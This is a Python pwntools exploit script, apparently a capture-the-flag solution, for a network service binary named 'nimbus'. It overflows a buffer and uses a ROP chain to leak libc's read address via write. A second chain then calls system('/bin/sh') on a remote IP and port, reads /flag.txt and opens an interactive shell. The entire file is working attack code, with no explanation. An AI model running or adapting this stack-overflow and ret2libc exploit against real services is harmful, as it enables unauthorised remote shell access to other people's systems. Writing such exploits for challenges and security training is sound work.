#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./nimbus', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

PARSER = 0x40ad80
POP_RDI = 0x403326
POP_RSI = 0x403b14
POP_RDX = 0x40ad56
RET = 0x40101a


def add_checksum(body):
    fix = 0x5a
    for byte in body:
        fix ^= byte
    return body + bytes([fix & 0xff])


def packet(body):
    payload = add_checksum(body)
    assert 1 <= len(payload) <= 0x800
    checksum = 0
    for byte in payload:
        checksum ^= byte
    assert checksum == 0x5a
    return p32(len(payload)) + payload


def leak_packet():
    body = b'A' * 88
    body += p64(POP_RDI) + p64(1)
    body += p64(POP_RSI) + p64(elf.got['read'])
    body += p64(POP_RDX) + p64(8)
    body += p64(elf.plt['write'])
    body += p64(PARSER)
    return packet(body)


def shell_packet(libc_base):
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
    body = b'B' * 88
    body += p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
    return packet(body)


if args.REMOTE:
    io = remote('15.232.64.175', 13341)
else:
    io = process('./nimbus', env={'LD_LIBRARY_PATH': '.'})

io.recvuntil(b'READY\n')
io.send(leak_packet())
io.recvuntil(b'OK\n')
leaked_read = u64(io.recvn(8))
libc_base = leaked_read - libc.symbols['read']
log.info(f'leaked read = {leaked_read:#x}')
log.info(f'libc base   = {libc_base:#x}')

io.send(shell_packet(libc_base))
io.sendline(b'cat /flag.txt')
io.interactive()
